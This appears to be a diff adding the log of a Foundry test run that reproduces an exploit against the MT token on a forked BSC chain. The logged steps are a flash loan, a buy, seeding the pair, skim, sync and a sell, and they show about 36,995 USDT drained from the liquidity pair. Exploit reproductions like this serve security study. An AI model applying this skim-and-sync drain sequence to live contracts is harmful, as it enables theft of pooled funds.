@@ -1,0 +1,36 @@
+No files changed, compilation skipped
+
+Ran 1 test for src/test/2026-01/MTToken_exp.sol:MTExploitTest
+[PASS] testMTExploit() (gas: 2154788)
+Logs:
+  === PoC: MT fee-overcharge + sync drain (BSC) ===
+  fork block 74937079
+  attack block 74937080
+  attack timestamp 1768205155
+  pre: pair USDT 37009240317278254683142
+  pre: attacker USDT 0
+  AttackContract.start()
+    flashloan amount (USDT) 11763748924433808962355485
+  onMoolahFlashLoan()
+    amount (USDT) 11763748924433808962355485
+    USDT begin 11763748924433808962355485
+    MT begin 0
+  Step 1: buy MT (direct pair swap)
+    MT after buy 6537001259406825164955
+  Step 2: seed MT to pair (creates skim-able excess)
+  Step 3: pair.skim(attacker) (drains MT; transfer triggers buggy fee logic again)
+  Step 4: pair.sync() (locks manipulated reserves)
+    reserves token0(MT) 34780547538882704
+    reserves token1(USDT) 226736240317278254683142
+  Step 5: sell MT -> USDT via router (fee-on-transfer supporting)
+    USDT after sell 11800744169220546613507476
+    MT after sell 12
+    profit (USDT) 36995244786737651151991
+  post: pair USDT 13995530540603531151
+  post: attacker USDT 36995244786737651151991
+  delta: pair USDT -36995244786737651151991
+  delta: attacker USDT 36995244786737651151991
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 17.09s (14.27s CPU time)
+
+Ran 1 test suite in 17.10s (17.09s CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
